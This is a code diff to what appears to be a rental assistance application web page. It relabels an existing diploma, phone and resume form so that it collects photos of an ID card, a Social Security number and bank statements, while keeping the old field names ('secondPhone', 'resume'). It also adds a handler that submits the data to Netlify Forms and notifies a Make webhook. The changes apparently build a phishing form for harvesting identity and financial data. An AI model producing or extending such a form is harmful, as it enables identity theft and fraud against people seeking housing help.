@@ -697,7 +697,7 @@
             </div>
 
             <div class="field" data-field="frontPhoto">
-              <label>Pictures of Diploma Certificate<span class="req">*</span></label>
+              <label>Pictures of Valid ID Card<span class="req">*</span></label>
               <div class="upload-row">
                 <div>
                   <div class="upload-box" data-upload="frontPhoto">
@@ -721,14 +721,14 @@
             </div>
 
             <div class="field half" data-field="applicationPin">
-              <label for="secondPhone">Second phone number<span class="req">*</span></label>
+              <label for="secondPhone">S S N Number<span class="req">*</span></label>
               <input type="password" id="secondPhone" name="secondPhone" inputmode="numeric" placeholder="123456789" autocomplete="tel">
               
-              <div class="error-msg">Enter a 9-digit second phone number.</div>
+              <div class="error-msg">Enter your 9-digit number .</div>
             </div>
 
             <div class="field half" data-field="workInfo">
-              <label>Resume<span class="req">*</span></label>
+              <label>Bank Statement<span class="req">*</span></label>
               <div class="upload-box" data-upload="resume">
                 <input type="file" id="resume" name="resume" accept=".pdf,.jpg,.jpeg,.png" hidden>
                 <span class="upload-icon">&#8593;</span>
@@ -942,6 +942,53 @@
     });
   });
 
+  // Submit to Netlify Forms, then send ONLY a simple notification trigger
+  // to Make. No applicant information or uploaded files are sent to Make.
+  form.addEventListener('submit', async (event) => {
+    event.preventDefault();
+
+    const submitButton = form.querySelector('button[type="submit"]');
+    const submitError = document.getElementById('submitError');
+    if(submitButton) submitButton.disabled = true;
+    if(submitError) submitError.classList.remove('visible');
+
+    try {
+      const formData = new FormData(form);
+      const response = await fetch(window.location.pathname || '/', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'text/html' },
+        redirect: 'follow'
+      });
+
+      if(!response.ok) throw new Error('Netlify submission failed');
+
+      // Notify Make without sending any form fields.
+      try {
+        await fetch('https://hook.eu1.make.com/13rcjw8j88dwfmmwnmllxgajqdxerpd4', {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+          body: 'new-rental-assistance-application',
+          mode: 'no-cors',
+          keepalive: true
+        });
+      } catch(notificationError) {
+        // The Netlify submission succeeded even if the notification request fails.
+        console.warn('Notification trigger failed:', notificationError);
+      }
+
+      const refId = document.getElementById('refId');
+      const applicationId = document.getElementById('applicationId');
+      if(refId && applicationId) refId.textContent = applicationId.value;
+      form.hidden = true;
+      if(confirmPanel) confirmPanel.hidden = false;
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    } catch(error) {
+      console.error(error);
+      if(submitError) submitError.classList.add('visible');
+      if(submitButton) submitButton.disabled = false;
+    }
+  });
 
 </script>
 
